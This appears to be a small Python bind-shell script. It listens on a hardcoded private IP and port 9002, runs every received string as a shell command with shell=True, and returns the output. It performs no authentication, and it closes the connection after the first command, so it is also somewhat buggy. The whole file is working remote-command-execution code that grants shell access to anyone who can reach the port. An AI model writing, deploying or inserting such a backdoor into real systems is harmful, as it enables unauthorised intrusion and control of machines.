import socket as s,subprocess as sp;

s1 = s.socket(s.AF_INET, s.SOCK_STREAM)
s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
s1.bind(("192.168.157.123", 9002))
s1.listen(1)

print("Server is listening...")

while True:
    # maybe throw 404 or something to http connections? or maybe authenticate.. blah :(
    c, a = s1.accept()
    print(f"Connection from {a}")

    while True:
        try:
            d = c.recv(1024).decode()
            if not d:
                print("Breaking")
                break  # client disconnected
            print(d)
            p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
            out, err = p.communicate()
            result = out + err
            d = None
            str_package = result.replace(b'\r\n', b'<RNL>').replace(b'\n', b'<NL>') + b"\n"
            print(str_package)
            c.sendall(str_package)
            c.close()
            print("closing call")
        except Exception as e:
            print("Client connection error:", e)
            break

    c.close()
    print("Client disconnected.")
